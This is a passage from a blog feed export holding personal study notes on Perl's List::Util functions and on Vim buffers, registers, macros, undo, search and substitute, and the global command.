@characters;<br></code></pre></td></tr></table></figure><p>计算总和, 利用 <code>sum</code> 子程序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(sum)</span>;<br><span class="hljs-keyword">my</span> $total = sum( <span class="hljs-number">1</span>..<span class="hljs-number">1000</span> );<br></code></pre></td></tr></table></figure><p>最大值:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(maxstr)</span>;<br><span class="hljs-keyword">my</span> $max = maxstr( @strings );<br></code></pre></td></tr></table></figure><p>元素随机排序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(shuffle)</span>;<br><span class="hljs-keyword">my</span> @shuffled = shuffle(<span class="hljs-number">1</span>..<span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p>List::MoreUtils, 提供更多工具, 但不是 Perl 自带的.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn-Vim-On-Github</title>
    <link href="/2022/07/04/Learn-Vim-On-Github/"/>
    <url>/2022/07/04/Learn-Vim-On-Github/</url>
    
    <content type="html"><![CDATA[<!-- toc --><hr><h2 id="Buffers-Windows-and-Tabs"><a href="#Buffers-Windows-and-Tabs" class="headerlink" title="Buffers, Windows and Tabs"></a>Buffers, Windows and Tabs</h2><h3 id="Buffers"><a href="#Buffers" class="headerlink" title="Buffers"></a>Buffers</h3><p>use <code>:buffers</code> to see all the buffers.</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> Create buffer. Each <span class="hljs-built_in">time</span> you <span class="hljs-built_in">open</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span>, Vim <span class="hljs-built_in">create</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> buffer <span class="hljs-keyword">for</span> that <span class="hljs-built_in">file</span>.<br><span class="hljs-number">2.</span> Delete buffer. use `:bdelete`.<br><span class="hljs-comment">### Windows</span><br>A window is how you are viewing <span class="hljs-keyword">a</span> buffer through. You are looking <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> buffer, displayed through <span class="hljs-keyword">a</span> window.<br></code></pre></td></tr></table></figure><p>If two windowes display the same buffer, when typing on one window, the other window will update in real-time.</p><h3 id="Tabs"><a href="#Tabs" class="headerlink" title="Tabs"></a>Tabs</h3><p>A collection of windows or it can be seen as a layout for windows.</p><p>It’s something we always see on the head of the screen.</p><p>run <code>gT</code> to go to next tab page.</p><h2 id="Searching-Files"><a href="#Searching-Files" class="headerlink" title="Searching Files"></a>Searching Files</h2><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p><code>:find</code> find file in <code>path</code>. <code>set path?</code>.</p><p>  path&#x3D;.,&#x2F;usr&#x2F;include,,</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">- `.` <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> currently opened <span class="hljs-built_in">file</span>.<br>- `,` <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> current <span class="hljs-built_in">file</span>.<br></code></pre></td></tr></table></figure><p>modify the paths.<br><mark>Add</mark></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">set</span> path+=app/controllers<br></code></pre></td></tr></table></figure><p>Add entire project directories:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">:<span class="hljs-built_in">set</span> path+=<span class="hljs-variable">$</span>&#123;<span class="hljs-built_in">PWD</span>&#125;/**<br></code></pre></td></tr></table></figure><p><code>**</code> means search recursively</p><h3 id="Grep"><a href="#Grep" class="headerlink" title="Grep"></a>Grep</h3><ul><li>Internal grep <code>:vimgrep</code>. Using <code>/pattern/</code>.</li><li>External grep <code>:grep</code>. Using <code>&quot;pattern&quot;</code>.</li></ul><h4 id="quickfix-command"><a href="#quickfix-command" class="headerlink" title="quickfix command"></a>quickfix command</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> <span class="hljs-code">`:copen`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:cclose`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:cnext`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:cprevious`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:colder`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:cnewer`</span><br></code></pre></td></tr></table></figure><h3 id="Netrw"><a href="#Netrw" class="headerlink" title="Netrw"></a>Netrw</h3><p><code>netrw</code> is Vim’s built-in file exploer.</p><p>I use NERDTree.</p><h3 id="Fzf"><a href="#Fzf" class="headerlink" title="Fzf"></a>Fzf</h3><p>fzf means “command-line fuzzy finder”.<br>Two plugin:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>fzf.vim<br><span class="hljs-bullet">- </span>ripgrep.vim<br></code></pre></td></tr></table></figure><p>It can have powerful usage when it is combined with ripgrep.</p><p>Actully, I use Ack instead of these two.</p><h2 id="Vim-Grammar"><a href="#Vim-Grammar" class="headerlink" title="Vim Grammar"></a>Vim Grammar</h2><p>Grammer rule in Vim language.</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">verb + <span class="hljs-built_in">noun</span><br></code></pre></td></tr></table></figure><h2 id="Moving-in-a-File"><a href="#Moving-in-a-File" class="headerlink" title="Moving in a File"></a>Moving in a File</h2><h3 id="Marking-Position"><a href="#Marking-Position" class="headerlink" title="Marking Position"></a>Marking Position</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">ma    Mark position <span class="hljs-keyword">with</span> mark <span class="hljs-string">&quot;a&quot;</span><br>\`a`    Jump <span class="hljs-keyword">to</span> <span class="hljs-literal">line</span> <span class="hljs-keyword">and</span> colume <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-symbol">&#x27;a</span>    Jump <span class="hljs-keyword">to</span> <span class="hljs-literal">line</span> <span class="hljs-string">&quot;a&quot;</span><br></code></pre></td></tr></table></figure><p>Lowercase alphabets are local marks and uppercase alphabets are global marks.</p><p>Global mark can travel across files.</p><p>To view all marks, use <code>:marks</code>.</p><h3 id="Jump"><a href="#Jump" class="headerlink" title="Jump"></a>Jump</h3><p>Read <code>:help jump-motions</code> </p><h2 id="The-Dot-Command"><a href="#The-Dot-Command" class="headerlink" title="The Dot Command"></a>The Dot Command</h2><p>The dot command <code>.</code> repeats the last change.</p><h3 id="What’s-a-change"><a href="#What’s-a-change" class="headerlink" title="What’s a change"></a>What’s a change</h3><p>Any time you update the content of the current buffer, like adding, modifying or deleting.</p><h2 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h2><p>Using register in insert mode <code>Ctrl-r</code></p><h3 id="Ten-Register-Types"><a href="#Ten-Register-Types" class="headerlink" title="Ten Register Types"></a>Ten Register Types</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>. The unnamed register <span class="hljs-string">&quot;&quot;</span> <br><span class="hljs-number">2</span>. The numbered <span class="hljs-keyword">registers</span> (<span class="hljs-comment">&quot;0-9).</span><br><span class="hljs-number">3</span>. The small <span class="hljs-keyword">delete</span> register (<span class="hljs-comment">&quot;-).</span><br><span class="hljs-number">4</span>. The named <span class="hljs-keyword">registers</span> (<span class="hljs-comment">&quot;a-z).</span><br><span class="hljs-number">5</span>. The <span class="hljs-keyword">read</span>-<span class="hljs-keyword">only</span> <span class="hljs-keyword">registers</span> (<span class="hljs-string">&quot;:, &quot;</span>.,<span class="hljs-built_in">and</span> <span class="hljs-comment">&quot;%).</span><br><span class="hljs-number">6</span>. The alternate <span class="hljs-keyword">file</span> register (<span class="hljs-comment">&quot;#).</span><br><span class="hljs-number">7</span>. The expression register (<span class="hljs-comment">&quot;=).</span><br><span class="hljs-number">8</span>. The selection <span class="hljs-keyword">registers</span> (<span class="hljs-string">&quot;* and &quot;</span>+).<br><span class="hljs-number">9</span>. The black hole register (<span class="hljs-comment">&quot;_).</span><br><span class="hljs-number">10</span>.The <span class="hljs-keyword">last</span> <span class="hljs-built_in">search</span> pattern register (<span class="hljs-comment">&quot;/).</span><br></code></pre></td></tr></table></figure><p>The rule of thumb is, if an operator can remove a text, it probably stores the text to registers.</p><p>To paste the text from register a, do <code>&quot;ap</code>.</p><p>The general syntax to get the content from a specific register is <code>&quot;a</code>.<br>Can I say the motion like <code>y d p</code> are registers?</p><h3 id="The-Non-zero-Numbered-Registers"><a href="#The-Non-zero-Numbered-Registers" class="headerlink" title="The Non-zero Numbered Registers"></a>The Non-zero Numbered Registers</h3><p>Store the deleted text.</p><h3 id="The-Small-Delete-Register"><a href="#The-Small-Delete-Register" class="headerlink" title="The Small Delete Register"></a>The Small Delete Register</h3><p>Changes less than one line are stored in the small delete register <code>&quot;-</code></p><h3 id="The-Named-Regiter"><a href="#The-Named-Regiter" class="headerlink" title="The Named Regiter"></a>The Named Regiter</h3><p>You have to explicitly tell Vim to use the named register.</p><p>To yank a word into regiter a <code>&quot;ayiw</code></p><p><mark>small conclusion</mark><br>To use the register, you may follow, <code>&quot;(registername)+motion</code>, like <code>&quot;ap</code>, <code>a</code> is the name of the register, <code>p</code> is the paste motion.</p><p>All twenty-six alphabetical charactors can be used as the named registers.</p><p><mark>Uppercase</mark> version of register is ok.</p><h3 id="The-Read-only-Register"><a href="#The-Read-only-Register" class="headerlink" title="The Read-only Register"></a>The Read-only Register</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">. Stores <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> inserted <span class="hljs-keyword">text</span><br>: Stores <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> executed <span class="hljs-keyword">command</span><span class="hljs-title">-line</span><br>% Stores <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> current <span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><h3 id="The-Expression-Register"><a href="#The-Expression-Register" class="headerlink" title="The Expression Register"></a>The Expression Register</h3><p>To get value from other rigister <code>&quot;=@a</code></p><h3 id="The-Selection-Register"><a href="#The-Selection-Register" class="headerlink" title="The Selection Register"></a>The Selection Register</h3><p>quotestar <code>&quot;*</code> and quoteplus <code>&quot;+</code> are connected to your clipboard.</p><h3 id="Clear-a-Register"><a href="#Clear-a-Register" class="headerlink" title="Clear a Register"></a>Clear a Register</h3><p><code>qaq</code> Let Vim to record an empty macro in the register a.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">call</span> <span class="hljs-built_in">setreg</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;hello register a&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>:let @a = &#39;&#39;</code>.</p><h3 id="Viewing-the-Registers"><a href="#Viewing-the-Registers" class="headerlink" title="Viewing the Registers"></a>Viewing the Registers</h3><p><code>:register</code> to view all registers, <code>:register a</code> only view register a.</p><h3 id="Putting-the-Content-of-a-Register"><a href="#Putting-the-Content-of-a-Register" class="headerlink" title="Putting the Content of a Register"></a>Putting the Content of a Register</h3><p>Use <code>:put</code> command. like <code>:put a</code></p><h2 id="Micros"><a href="#Micros" class="headerlink" title="Micros"></a>Micros</h2><p>Using Vim macros, you can record actions and store them inside Vim register.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">qa  To Start recording a <span class="hljs-function"><span class="hljs-keyword">macro</span> <span class="hljs-title">in</span></span> register a <br>q(<span class="hljs-keyword">while</span> recording)  Stop recording <span class="hljs-function"><span class="hljs-keyword">macro</span> </span><br></code></pre></td></tr></table></figure><p>Execute a macro:<br><code>@a  Execute macro from register a</code><br><code>@@  Execute the last executed macros</code><br><mark>Small Conclusion</mark><br>Macro is still using registers. Some differences, the <code>@</code> can execute commands.<br>Macro execution automatically ends when it encounters an error.</p><h3 id="Command-Line-Macro"><a href="#Command-Line-Macro" class="headerlink" title="Command Line Macro"></a>Command Line Macro</h3><p>You can run <code>normal! @a</code>.</p><p>execute macro between line 2 and 3, run <code>:2, 3 normal @a</code>.</p><p><code>99@a</code> will execute macro for 99 times, but most of the time it will ends early.</p><p><code>:g/pattern/normal @a</code> it executes the command you give on lines that match the pattern.</p><p>A useful key <code>~</code> toggle the case of the character under the cursor.</p><h3 id="Appending-a-Macro"><a href="#Appending-a-Macro" class="headerlink" title="Appending a Macro"></a>Appending a Macro</h3><p>Append a named register by using its uppercased symbal. If you want to add action to register a macro, using register A.</p><h3 id="Amending-a-Macro"><a href="#Amending-a-Macro" class="headerlink" title="Amending a Macro"></a>Amending a Macro</h3><p><mark>Small Conclusion</mark><br>Some macro can resolve the lack of the key to replace the mapping.<br><code>^[</code> is Vim’s internal code representation of <code>&lt;Esc&gt;</code>.</p><p>Find the other internal code representation of some keys.</p><p>one way: <code>:let @a=</code></p><h3 id="Macro-Redundancy"><a href="#Macro-Redundancy" class="headerlink" title="Macro Redundancy"></a>Macro Redundancy</h3><p>To duplicate a macro in register a to register z <code>:let @z=@a</code></p><p>Almost everything that you can do in Vim can be replicated with macros.</p><h2 id="Undo"><a href="#Undo" class="headerlink" title="Undo"></a>Undo</h2><p>Vim undoes a single “change” at a time. When you enter the insert mode until you exit it count a change.</p><p><code>undolevels</code> option.</p><p>Undo breakpoint.</p><h3 id="Undo-Tree"><a href="#Undo-Tree" class="headerlink" title="Undo Tree"></a>Undo Tree</h3><p>Every time you press <code>u</code> and then make a different change, Vim store the previous state’s text by creating an “undo branch”.</p><p>Typing <code>g+</code> can go to a newer state and <code>g-</code> can go to a previous state.</p><p>Adding plugin vim-mundo.</p><p>To use undo tree, enter <code>undolist</code>.</p><h4 id="Usage-of-mundo"><a href="#Usage-of-mundo" class="headerlink" title="Usage of mundo"></a>Usage of mundo</h4><p><a href="https://simnalamburt.github.io/vim-mundo/">office document</a><br>Your current position in the undo tree is marked with an <code>@</code> character. </p><p>Pressing <code>p</code> to preview the diff.  </p><h3 id="Persistent-Undo"><a href="#Persistent-Undo" class="headerlink" title="Persistent Undo"></a>Persistent Undo</h3><p><code>:wundo &#123;my-undo-file&#125;</code> to create a undo file, adding <code>!</code> to overwrite.</p><p><code>rundo &#123;file&#125;</code> to reading the undo file.</p><h3 id="Time-Travel"><a href="#Time-Travel" class="headerlink" title="Time Travel"></a>Time Travel</h3><p><code>:earlier 10s</code> back to 10 seconds ago.<br><code>:earlier 2</code> 2 changes ago<br><code>:earlier 10f</code> 10 saves ago</p><p><code>:later 10s</code>.</p><h2 id="Visual-Mode"><a href="#Visual-Mode" class="headerlink" title="Visual Mode"></a>Visual Mode</h2><p>Pressing <code>gU</code> to uppercase the selected text.</p><h3 id="Incrementing-Numbers"><a href="#Incrementing-Numbers" class="headerlink" title="Incrementing Numbers"></a>Incrementing Numbers</h3><p><code>Ctrl-A</code> command to increse, <code>Ctrl-X</code> command to decrese</p><p><code>g Ctrl-A</code> 递增，<code>g Ctrl-X</code> 递减.</p><h3 id="Selecting-the-Last-Visual-Mode-Area"><a href="#Selecting-the-Last-Visual-Mode-Area" class="headerlink" title="Selecting the Last Visual Mode Area"></a>Selecting the Last Visual Mode Area</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">`&lt;  Go <span class="hljs-keyword">to</span> the <span class="hljs-keyword">first</span> place of the <span class="hljs-keyword">previous</span> <span class="hljs-keyword">visual</span> <span class="hljs-keyword">mode</span> <span class="hljs-keyword">highlight</span><br>`&gt;  Go <span class="hljs-keyword">to</span> the <span class="hljs-keyword">last</span> place of the <span class="hljs-keyword">previous</span> <span class="hljs-keyword">visual</span> <span class="hljs-keyword">mode</span> <span class="hljs-keyword">highlight</span><br></code></pre></td></tr></table></figure><p>Deleting an inner word use <code>viwd</code></p><h2 id="Search-and-Substitude"><a href="#Search-and-Substitude" class="headerlink" title="Search and Substitude"></a>Search and Substitude</h2><p><code>/</code> can also be done with <code>?</code></p><p>Add case sensitivity: <code>:set ignorecase</code></p><h3 id="Repeating-Search"><a href="#Repeating-Search" class="headerlink" title="Repeating Search"></a>Repeating Search</h3><p>Repeating the previous search with <code>//</code>.</p><p>To see all search history, running <code>:history /</code>.</p><p><code>:set wrapscan</code> option to make Vim to search back at the top of the file when you reach the end of the file.</p><h3 id="Searching-for-Alternative-Words"><a href="#Searching-for-Alternative-Words" class="headerlink" title="Searching for Alternative Words"></a>Searching for Alternative Words</h3><p>Using <code>|</code> pattern, like <code>/\vhello|world</code></p><h3 id="Setting-the-Start-and-End-of-a-Match"><a href="#Setting-the-Start-and-End-of-a-Match" class="headerlink" title="Setting the Start and End of a Match"></a>Setting the Start and End of a Match</h3><p>Using <code>\zs</code> to set starting of a match and <code>\ze</code> to set ending of a match</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/11</span>\zsvim\ze22<br></code></pre></td></tr></table></figure><p>Matching the strings start with 11 and end with 22.</p><h3 id="Searching-for-Repeating-Characters"><a href="#Searching-for-Repeating-Characters" class="headerlink" title="Searching for Repeating Characters"></a>Searching for Repeating Characters</h3><p>Passing <code>count</code> to your search.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;n,m&#125;</span><br></code></pre></td></tr></table></figure><p>four different variations of the <code>count</code> syntax.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;n&#125;</span><span class="language-xml">, /[0-9]\</span><span class="hljs-template-variable">&#123;2\&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;n,m&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;,m&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;n,&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Predefined-Character-Ranges"><a href="#Predefined-Character-Ranges" class="headerlink" title="Predefined Character Ranges"></a>Predefined Character Ranges</h3><p>Full list inside <code>:h /character-classes</code></p><h3 id="Basic-Substitution"><a href="#Basic-Substitution" class="headerlink" title="Basic Substitution"></a>Basic Substitution</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">:s<span class="hljs-regexp">/&#123;old-pattern&#125;/</span>&#123;<span class="hljs-keyword">new</span>-pattern&#125;/<br></code></pre></td></tr></table></figure><h3 id="Substitution-Range"><a href="#Substitution-Range" class="headerlink" title="Substitution Range"></a>Substitution Range</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">:[range]s<span class="hljs-regexp">/old/</span><span class="hljs-keyword">new</span>/<br></code></pre></td></tr></table></figure><p>example:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">:<span class="hljs-number">3</span>,<span class="hljs-number">5</span>s<span class="hljs-regexp">/let/</span>const/<br></code></pre></td></tr></table></figure><p>To substisude on lines three to five.</p><p>Range variation:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">:,<span class="hljs-number">3</span>s<span class="hljs-regexp">/let/</span>const/<br>:<span class="hljs-number">1</span>,s<span class="hljs-regexp">/let/</span>const/<br>:<span class="hljs-number">3</span>s<span class="hljs-regexp">/let/</span>const/<br></code></pre></td></tr></table></figure><p><code>%</code> always means the entire file. <code>%ss/let/const/</code></p><h3 id="Substitude-Flags"><a href="#Substitude-Flags" class="headerlink" title="Substitude Flags"></a>Substitude Flags</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&amp;    Reuse the flags <span class="hljs-keyword">from</span> the previous substitute command.<br>g    Replace <span class="hljs-keyword">all</span> matches <span class="hljs-keyword">in</span> the <span class="hljs-type">line</span>.<br>c    Ask <span class="hljs-keyword">for</span> substitution confirmation.<br>e    Prevent error message <span class="hljs-keyword">from</span> displaying <span class="hljs-keyword">when</span> substitution fails.<br>i    <span class="hljs-keyword">Perform</span> <span class="hljs-keyword">case</span> insensitive substitution.<br>I    <span class="hljs-keyword">Perform</span> <span class="hljs-keyword">case</span> sensitive substitution.<br></code></pre></td></tr></table></figure><h3 id="Changing-the-Delimiter"><a href="#Changing-the-Delimiter" class="headerlink" title="Changing the Delimiter"></a>Changing the Delimiter</h3><p>You can change the delimiter with any single-byte characters.o</p><h3 id="Substituting-Across-Multiple-Files"><a href="#Substituting-Across-Multiple-Files" class="headerlink" title="Substituting Across Multiple Files"></a>Substituting Across Multiple Files</h3><p><code>:args</code> and <code>:argdo</code> are useful tools to apply command line commands across multiple files.</p><h3 id="args-and-argdo"><a href="#args-and-argdo" class="headerlink" title=":args and :argdo"></a><code>:args</code> and <code>:argdo</code></h3><p><code>:args</code> is argument list. <code>:argdo</code> execute {cmd} for each file in the argument list.</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">:<span class="hljs-comment">[range]</span>argdo<span class="hljs-comment">[!]</span> &#123;cmd&#125;<br></code></pre></td></tr></table></figure><h2 id="The-Global-Command"><a href="#The-Global-Command" class="headerlink" title="The Global Command"></a>The Global Command</h2><p>Repeating the last change with the dot command <code>.</code>, Replaying actions with macros <code>q</code>, storing texts in the registers <code>&quot;</code>.</p><h3 id="Global-Command-Overview"><a href="#Global-Command-Overview" class="headerlink" title="Global Command Overview"></a>Global Command Overview</h3><p>Both Ex commmands and command-line commands are the same. They are the commands that start with a colon <code>:</code>.</p><p>They are called Ex because they originally came from the Ex text editor.</p><p>Check out <code>:h ex-cmd-index</code></p><p>Syntax:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/pattern/command</span><br></code></pre></td></tr></table></figure><p>The global command works by executing <code>command</code> against each line that matches the pattern.</p><p>When running the <code>g</code> command, Vim makes two scans across file.</p><h3 id="Inverse-Match"><a href="#Inverse-Match" class="headerlink" title="Inverse Match"></a>Inverse Match</h3><p>To run the global command on non-matching lines.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g!/pattern/command</span><br></code></pre></td></tr></table></figure><p>or</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:v/pattern/command</span><br></code></pre></td></tr></table></figure><h3 id="Pattern"><a href="#Pattern" class="headerlink" title="Pattern"></a>Pattern</h3><p>Same pattern system as the substitude command.</p><h3 id="Passing-a-Range"><a href="#Passing-a-Range" class="headerlink" title="Passing a Range"></a>Passing a Range</h3><p>If no range are given, by default it affects the entire file.</p><p>Symbles as range:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.   means <span class="hljs-keyword">the</span> current <span class="hljs-built_in">line</span>. .,<span class="hljs-number">3</span><br>$   means <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span><br>+n means n <span class="hljs-keyword">lines</span> <span class="hljs-keyword">after</span> <span class="hljs-keyword">the</span> current <span class="hljs-built_in">line</span>. <span class="hljs-number">3</span>,.+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Executing-a-Macro"><a href="#Executing-a-Macro" class="headerlink" title="Executing a Macro"></a>Executing a Macro</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/const/normal</span> <span class="hljs-variable">@a</span><br></code></pre></td></tr></table></figure><h3 id="Recursive-Global-Command"><a href="#Recursive-Global-Command" class="headerlink" title="Recursive Global Command"></a>Recursive Global Command</h3><p>The global command itself is a type of a command-line command.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/console/g/two/d</span><br></code></pre></td></tr></table></figure><h3 id="Changing-the-Delimiter-1"><a href="#Changing-the-Delimiter-1" class="headerlink" title="Changing the Delimiter"></a>Changing the Delimiter</h3><p>Still, you can use any single byte character except for alphabets, numbers, <code>&quot;</code>, <code>|</code> and <code>\</code></p><p>like <code>:g@console@d</code></p><h3 id="The-Default-Command"><a href="#The-Default-Command" class="headerlink" title="The Default Command"></a>The Default Command</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/console</span><br></code></pre></td></tr></table></figure><p>as </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/console/p</span><br></code></pre></td></tr></table></figure><p>The syntax:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/re/p</span><br></code></pre></td></tr></table></figure><p><code>grep</code> got its name there.</p><h3 id="Black-Hole-Delete"><a href="#Black-Hole-Delete" class="headerlink" title="Black Hole Delete"></a>Black Hole Delete</h3><p>Make Vim not store your deleted lines into the registers.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/console/d_</span><br></code></pre></td></tr></table></figure><h3 id="Reduce-Multiple-Empty-Lines-to-One-Empty-Line"><a href="#Reduce-Multiple-Empty-Lines-to-One-Empty-Line" class="headerlink" title="Reduce Multiple Empty Lines to One Empty Line"></a>Reduce Multiple Empty Lines to One Empty Line</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">:g/^</span><span class="hljs-variable">$/</span>,<span class="hljs-regexp">/./</span>-1j<br></code></pre></td></tr></table></figure><p><code>j</code> is the <code>join</code> command.<br>Another form of global command:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">:g/pattern1/</span>,<span class="hljs-regexp">/pattern2/command</span><br></code></pre></td></tr></table></figure><h3 id="Advanced-Sort"><a href="#Advanced-Sort" class="headerlink" title="Advanced Sort"></a>Advanced Sort</h3><p>You can give a range:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">:<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-built_in">sort</span><br></code></pre></td></tr></table></figure><h2 id="External-Commands"><a href="#External-Commands" class="headerlink" title="External Commands"></a>External Commands</h2><h3 id="The-Bang-Command"><a href="#The-Bang-Command" class="headerlink" title="The Bang Command"></a>The Bang Command</h3><p><code>!</code> can do three things. 